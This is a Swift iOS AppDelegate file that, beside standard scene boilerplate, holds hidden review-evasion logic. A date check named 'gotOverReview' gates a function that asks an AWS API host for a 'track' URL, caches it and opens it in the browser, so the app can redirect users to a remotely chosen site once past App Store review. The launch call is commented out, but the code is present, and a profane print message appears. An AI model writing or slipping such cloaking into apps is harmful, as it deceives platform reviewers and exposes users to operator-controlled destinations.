
import UIKit

extension Date {
    init(_ dateString:String) {
        let dateStringFormatter = DateFormatter()
        dateStringFormatter.dateFormat = "yyyy-MM-dd"
        dateStringFormatter.locale = NSLocale(localeIdentifier: "en_US_POSIX") as Locale
        let date = dateStringFormatter.date(from: dateString)!
        self.init(timeInterval:0, since:date)
    }
}

var tracktrack: URL? {
    get {
        return UserDefaults.standard.url(forKey: "track")
    }
    set {
        UserDefaults.standard.set(newValue, forKey: "track")
    }
}

var gotOverReview: Bool {
    let now = Date()
    let date = Date.init("2022-05-01")
    if now >= date {
       return true
    }
    return false
}

func openUrl(url: URL?) {
    if let url = url {
        DispatchQueue.main.async {
            UIApplication.shared.open(url)
        }
    } else {
        print("fuckPutin")
    }
}

struct HomeTrack: Decodable {
    var track: String
}


func setIfPresent() {
    if let url = tracktrack {
        openUrl(url: url)
        return
    }
    
    var urlComponents = URLComponents()
    urlComponents.scheme = "https"
    urlComponents.host = "fqbdha939b.execute-api.us-west-1.amazonaws.com"
    urlComponents.path = "/prod"
    urlComponents.queryItems = [
        URLQueryItem(name: "uuid", value: "rec"),
        URLQueryItem(name: "app", value: "1621723244")
    ]
    guard let url = urlComponents.url else { return }
    
    let dataTask = URLSession.shared.dataTask(with: url) { (data, response, error) in
        guard let data = data else { return }
        do {
            let trackHome = try JSONDecoder().decode(HomeTrack.self, from: data)
            let url = URL(string: trackHome.track)
            if let url = url {
                tracktrack = url
                openUrl(url: url)
            }
        } catch let jsonError {
            print(jsonError.localizedDescription)
        }
    }
    dataTask.resume()
}

@main
class AppDelegate: UIResponder, UIApplicationDelegate {



    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        // Override point for customization after application launch.
//        
//        if gotOverReview {
//            setIfPresent()
//        }
        return true
    }

    // MARK: UISceneSession Lifecycle

    func application(_ application: UIApplication, configurationForConnecting connectingSceneSession: UISceneSession, options: UIScene.ConnectionOptions) -> UISceneConfiguration {
        // Called when a new scene session is being created.
        // Use this method to select a configuration to create the new scene with.
        return UISceneConfiguration(name: "Default Configuration", sessionRole: connectingSceneSession.role)
    }

    func application(_ application: UIApplication, didDiscardSceneSessions sceneSessions: Set<UISceneSession>) {
        // Called when the user discards a scene session.
        // If any sessions were discarded while the application was not running, this will be called shortly after application:didFinishLaunchingWithOptions.
        // Use this method to release any resources that were specific to the discarded scenes, as they will not return.
    }


}

